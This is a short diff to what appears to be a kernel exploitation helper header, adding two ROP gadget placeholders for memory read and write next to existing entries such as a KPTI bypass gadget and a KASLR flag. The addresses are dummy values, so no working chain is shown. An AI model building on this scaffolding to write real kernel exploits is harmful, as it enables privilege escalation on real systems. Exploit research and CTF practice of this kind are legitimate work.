@@ -39,6 +39,8 @@ GLOBAL uint64_t kheap INIT(0);
 #define pop_rcx_ret (DUMMY_VALUE + kbase_offset)
 #define mov_rdi_rax_rep_ret (DUMMY_VALUE + kbase_offset)
 #define bypass_kpti (DUMMY_VALUE + kbase_offset)
+#define mov_prdx_rcx_ret (DUMMY_VALUE + kbase_offset)
+#define mov_rax_prdx_ret (DUMMY_VALUE + kbase_offset)
 
 // config variables
 GLOBAL bool kaslr INIT(true);
